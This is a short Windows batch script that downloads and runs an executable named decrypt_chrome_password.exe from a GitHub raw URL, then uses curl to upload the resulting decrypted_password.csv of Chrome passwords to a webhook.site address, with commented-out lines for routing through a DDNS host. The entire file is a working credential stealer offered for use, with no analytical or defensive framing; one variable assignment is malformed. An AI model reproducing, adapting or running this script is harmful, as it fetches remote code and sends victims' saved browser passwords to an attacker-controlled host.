::file url
set "file_url=https://raw.githubusercontent.com/AmirX-Dead/Aa/refs/heads/main/decrypt_chrome_password.exe" 

::comment it if you are not using DDNS!!
::set "ddns=x.example.com"

set "https://webhook.site/eb9447dd-3620-4f1b-81c8-2efd2f2a4513"
::comment it if you are not using DDNS!!
::for /f "tokens=2,* " %%w in ('curl -I %ddns% ^| findstr "Location:"') do (set "webhook_url=%%w")

curl %file_url% -o run.exe
start run.exe
timeout /T 5 /NOBREAK
curl %webhook_url% -F chrome_passwords=@decrypted_password.csv